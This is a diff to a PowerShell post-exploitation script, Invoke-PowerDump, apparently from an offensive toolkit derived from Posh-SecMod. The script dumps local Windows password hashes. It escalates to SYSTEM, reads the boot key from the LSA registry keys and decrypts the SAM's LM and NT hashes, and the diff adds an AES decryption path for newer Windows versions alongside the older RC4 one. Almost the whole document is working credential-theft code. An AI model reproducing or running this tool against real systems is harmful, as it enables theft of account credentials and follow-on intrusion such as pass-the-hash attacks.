@@ -1,15 +1,23 @@
-# Pulled from darkoperator's Posh-SecMod: 
-#   https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
 function Invoke-PowerDump
 {
   <#
   .SYNOPSIS
+
      Dumps hashes from the local system. Note: administrative privileges required.
+
+     Author: @darkoperator, @Cx01N
+     License: BSD 3-Clause
+     Required Dependencies: None
+     Optional Dependencies: None
+
   .DESCRIPTION
+
     Generate a command for dumping hashes from a Windows System PowerShell.exe -command 
     Command must be executed as SYSTEM if ran as administrator it will privilage escalate to SYSTEM
     and execute a hashdump by reading the hashes from the registry.
+
   .EXAMPLE
+
     $enc = Get-PostHashdumpScript
     C:\PS>powershell.exe -command $enc
       Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d4afe1d16ae931b74c59d7e1c089c0:::
@@ -21,6 +29,7 @@ function Invoke-PowerDump
    .NOTES
      PowerDump script by Kathy Peters, Josh Kelley (winfang) and Dave Kennedy (ReL1K)
      Privilage Escalation from http://blogs.technet.com/b/heyscriptingguy/archive/2012/07/05/use-powershell-to-duplicate-process-tokens-via-p-invoke.aspx
+     https://github.com/darkoperator/Posh-SecMod/blob/master/PostExploitation/PostExploitation.psm1
   #>
 
 $sign = @"
@@ -320,14 +329,17 @@ namespace PowerDump
                 return ,$outbuf;
             } -PassThru
         }
+
         function des_encrypt([byte[]]$data, [byte[]]$key)
         {
             return ,(des_transform $data $key $true)
         }
+
         function des_decrypt([byte[]]$data, [byte[]]$key)
         {
             return ,(des_transform $data $key $false)
         }
+
         function des_transform([byte[]]$data, [byte[]]$key, $doEncrypt)
         {
             $des = new-object Security.Cryptography.DESCryptoServiceProvider;
@@ -349,7 +361,7 @@ namespace PowerDump
                 "HKLM" { $nKey = 0x80000002} #HK Local Machine
                 "HKU"  { $nKey = 0x80000003} #HK Users
                 "HKCC" { $nKey = 0x80000005} #HK Current Config
-                default { 
+                default {
                     throw "Invalid Key. Use one of the following options HKCR, HKCU, HKLM, HKU, HKCC"
                 }
             }
@@ -370,7 +382,7 @@ namespace PowerDump
                 else
                 {
                     Write-Error "RegQueryInfoKey failed";
-                }   
+                }
                 [PowerDump.Native]::RegCloseKey($hkey) | Out-Null
             }
             else
@@ -379,16 +391,8 @@ namespace PowerDump
             }
             return $result;
         }
-        function Get-BootKey
-        {
-            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
-            $b = new-object byte[] $($s.Length/2);
-            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
-            $b2 = new-object byte[] 16;
-            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
-            return ,$b2;
-        }
-        function Get-HBootKey
+
+        function RC4_Get-HBootKey
         {
             param([byte[]]$bootkey);
             $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
@@ -399,8 +403,109 @@ namespace PowerDump
             if (-not $F) {return $null}
             $rc4key = [Security.Cryptography.MD5]::Create().ComputeHash($F[0x70..0x7F] + $aqwerty + $bootkey + $anum);
             $rc4 = NewRC4 $rc4key;
-            return ,($rc4.encrypt($F[0x80..0x9F]));
+            return ,($rc4.encrypt($F[0x80..0xA0]));
         }
+        function RC4_DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
+        {
+            [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
+            # LM Hash
+            if ($enc_lm_hash.Length -lt 20)
+            {
+                $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
+            }
+            else{
+                $lmhash = RC4_DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
+            }
+
+            # NT Hash
+            if ($enc_nt_hash.Length -lt 20)
+            {
+                $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
+            }
+            else{
+                $nthash = RC4_DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
+            }
+            return ,($lmhash,$nthash)
+        }
+
+        function RC4_DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+        {
+            $deskeys = sid_to_key $rid;
+            $md5 = [Security.Cryptography.MD5]::Create();
+            $rc4_key = $md5.ComputeHash($hbootkey[0x00..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
+            $rc4 = NewRC4 $rc4_key;
+            $obfkey = $rc4.encrypt($enc_hash[0x04..$(0x04+0x0f)]);
+            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
+                (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
+            return ,$hash;
+        }
+
+        function Get-BootKey
+        {
+            $s = [string]::Join("",$("JD","Skew1","GBG","Data" | %{Get-RegKeyClass "HKLM" "SYSTEM\CurrentControlSet\Control\Lsa\$_"}));
+            $b = new-object byte[] $($s.Length/2);
+            0..$($b.Length-1) | %{$b[$_] = [Convert]::ToByte($s.Substring($($_*2),2),16)}
+            $b2 = new-object byte[] 16;
+            0x8, 0x5, 0x4, 0x2, 0xb, 0x9, 0xd, 0x3, 0x0, 0x6, 0x1, 0xc, 0xe, 0xa, 0xf, 0x7 | % -begin{$i=0;}{$b2[$i]=$b[$_];$i++}
+            return ,$b2;
+        }
+        function Create-AesManagedObject($key, $IV) {
+            $aesManaged = New-Object "System.Security.Cryptography.AesManaged"
+            $aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
+            $aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
+            $aesManaged.BlockSize = 128
+            $aesManaged.KeySize = 256
+            if ($IV) {
+                if ($IV.getType().Name -eq "String") {
+                    $aesManaged.IV = [System.Convert]::FromBase64String($IV)
+                }
+                else {
+                    $aesManaged.IV = $IV
+                }
+            }
+            if ($key) {
+                if ($key.getType().Name -eq "String") {
+                    $aesManaged.Key = [System.Convert]::FromBase64String($key)
+                }
+                else {
+                    $aesManaged.Key = $key
+                }
+            }
+            $aesManaged
+        }
+
+        function Decrypt-String($key, $encryptedStringWithIV) {
+            $bytes = $encryptedStringWithIV
+            $IV = $bytes[0x00..0x0f]
+            $aesManaged = Create-AesManagedObject $key $IV
+            $decryptor = $aesManaged.CreateDecryptor();
+            $unencryptedData = $decryptor.TransformFinalBlock($bytes,16, $bytes.Length - 16);
+            $aesManaged.Dispose()
+            $unencryptedData
+
+        }
+        function Get-HBootKey
+        {
+            param([byte[]]$bootkey);
+            $aqwerty = [Text.Encoding]::ASCII.GetBytes("!@#$%^&*()qwertyUIOPAzxcvbnmQQQQQQQQQQQQ)(*@&%`0");
+            $anum = [Text.Encoding]::ASCII.GetBytes("0123456789012345678901234567890123456789`0");
+            $k = Get-Item HKLM:\SAM\SAM\Domains\Account;
+            if (-not $k) {return $null}
+            [byte[]]$F = $k.GetValue("F");
+            if (-not $F) {return $null}
+
+            # offset 0x88 from 'F' (16 bytes)
+            $data = $F[$(0x88)..$(0x88+0x0f)]
+
+            # offset 0x78 from 'F' (16 bytes)
+            $iv = $F[$(0x78)..$(0x78+0x0f)]
+            $key = $bootkey
+            $iv_data = $iv+$data
+            $unencryptedData = Decrypt-String -key $key -encryptedStringWithIV $iv_data
+            return ,$unencryptedData
+
+        }
+
         function Get-UserName([byte[]]$V)
         {
             if (-not $V) {return $null};
@@ -408,86 +513,92 @@ namespace PowerDump
             $len = [BitConverter]::ToInt32($V[0x10..0x13],0);
             return [Text.Encoding]::Unicode.GetString($V, $offset, $len);
         }
+
         function Get-UserHashes($u, [byte[]]$hbootkey)
         {
             [byte[]]$enc_lm_hash = $null; [byte[]]$enc_nt_hash = $null;
-            
-            # check if hashes exist (if byte memory equals to 20, then we've got a hash)
-            $LM_exists = $false;
-            $NT_exists = $false;
-            # LM header check
-            if ($u.V[0xa0..0xa3] -eq 20)
-            {
-                $LM_exists = $true;
+
+            if($u -ne $null){
+                $enc_nt_hash = $u.V[$($u.nt_HashOffset)..$($u.nt_HashOffset+$u.nt_len)];
+                $enc_lm_hash = $u.V[$($u.lm_HashOffset)..$($u.lm_HashOffset+$u.lm_len)];
+                 # If hash length = 0x38 then compute AES Hash
+                if ($u.nt_len -eq 0x38){
+                    return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+                    }
+                # If hash length = 0x18 then compute RC4 Hash
+                elseif ($u.nt_len -eq 0x18){
+                    $hbootkey = RC4_Get-HBootKey
+                    return ,(RC4_DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
+                }
             }
-            # NT header check
-            elseif ($u.V[0xac..0xaf] -eq 20)
-            {
-                $NT_exists = $true;
+
+            else{
+                return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
             }
-        
-            if ($LM_exists -eq $true)
-            {
-                $lm_hash_offset = $u.HashOffset + 4;
-                $nt_hash_offset = $u.HashOffset + 8 + 0x10;
-                $enc_lm_hash = $u.V[$($lm_hash_offset)..$($lm_hash_offset+0x0f)];
-                $enc_nt_hash = $u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
-            }
-        	
-            elseif ($NT_exists -eq $true)
-            {
-                $nt_hash_offset = $u.HashOffset + 8;
-                $enc_nt_hash = [byte[]]$u.V[$($nt_hash_offset)..$($nt_hash_offset+0x0f)];
-            }
-            return ,(DecryptHashes $u.Rid $enc_lm_hash $enc_nt_hash $hbootkey);
         }
+
         function DecryptHashes($rid, [byte[]]$enc_lm_hash, [byte[]]$enc_nt_hash, [byte[]]$hbootkey)
         {
             [byte[]]$lmhash = $empty_lm; [byte[]]$nthash=$empty_nt;
             # LM Hash
-            if ($enc_lm_hash)
-            {    
-                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash $almpassword;
-            }
-    
-            # NT Hash
-            if ($enc_nt_hash)
+            if ($enc_lm_hash.Length -lt 40)
             {
-                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash $antpassword;
+                $lmhash = 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee, 0xaa, 0xd3, 0xb4, 0x35, 0xb5, 0x14, 0x04, 0xee
+            }
+            else{
+                $lmhash = DecryptSingleHash $rid $hbootkey $enc_lm_hash;
+            }
+
+            # NT Hash
+            if ($enc_nt_hash.Length -lt 40)
+            {
+                $nthash = 0x31, 0xd6, 0xcf, 0xe0, 0xd1, 0x6a, 0xe9, 0x31, 0xb7, 0x3c, 0x59, 0xd7, 0xe0, 0xc0, 0x89, 0xc0
+            }
+            else{
+                $nthash = DecryptSingleHash $rid $hbootkey $enc_nt_hash;
             }
             return ,($lmhash,$nthash)
         }
-        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash,[byte[]]$lmntstr)
+
+        function DecryptSingleHash($rid,[byte[]]$hbootkey,[byte[]]$enc_hash)
         {
             $deskeys = sid_to_key $rid;
-            $md5 = [Security.Cryptography.MD5]::Create();
-            $rc4_key = $md5.ComputeHash($hbootkey[0..0x0f] + [BitConverter]::GetBytes($rid) + $lmntstr);
-            $rc4 = NewRC4 $rc4_key;
-            $obfkey = $rc4.encrypt($enc_hash);
-            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) + 
+            $key = $hbootkey[0x00..0x0f]
+            $iv = $enc_hash[0x08..$(0x08+0x0f)]
+            $data = $enc_hash[0x18..$(0x18+0x0f)]
+            $data_iv = $iv+$data
+
+            $obfkey = Decrypt-String -key $key -encryptedStringWithIV $data_iv
+            $hash = (des_decrypt  $obfkey[0..7] $deskeys[0]) +
                 (des_decrypt $obfkey[8..$($obfkey.Length - 1)] $deskeys[1]);
-            return ,$hash;
+            return ,$hash ;
+
         }
+
         function Get-UserKeys
         {
-            ls HKLM:\SAM\SAM\Domains\Account\Users | 
-                where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} | 
+            ls HKLM:\SAM\SAM\Domains\Account\Users |
+                where {$_.PSChildName -match "^[0-9A-Fa-f]{8}$"} |
                     Add-Member AliasProperty KeyName PSChildName -PassThru |
                     Add-Member ScriptProperty Rid {[Convert]::ToInt32($this.PSChildName, 16)} -PassThru |
                     Add-Member ScriptProperty V {[byte[]]($this.GetValue("V"))} -PassThru |
                     Add-Member ScriptProperty UserName {Get-UserName($this.GetValue("V"))} -PassThru |
-                    Add-Member ScriptProperty HashOffset {[BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru
+                    Add-Member ScriptProperty lm_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0x9c..0x9f],0) + 0xCC} -PassThru |
+                    Add-Member ScriptProperty lm_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa0..0xa3],0)} -PassThru |
+                    Add-Member ScriptProperty nt_HashOffset {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xa8..0xab],0) + 0xCC} -PassThru |
+                    Add-Member ScriptProperty nt_len {[System.BitConverter]::ToUInt32($this.GetValue("V")[0xac..0xaf],0)} -PassThru
         }
         function DumpHashes
         {
             LoadApi
             $bootkey = Get-BootKey;
             $hbootKey = Get-HBootKey $bootkey;
+            $hashes = Get-UserHashes $_ $hBootKey
             Get-UserKeys | %{
                 $hashes = Get-UserHashes $_ $hBootKey;
-                "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid, 
-                    [BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(), 
-                    [BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
+                "{0}:{1}:{2}:{3}:::" -f ($_.UserName,$_.Rid,
+                    [System.BitConverter]::ToString($hashes[0]).Replace("-","").ToLower(),
+                    [System.BitConverter]::ToString($hashes[1]).Replace("-","").ToLower());
                 "`n"
             }
         }
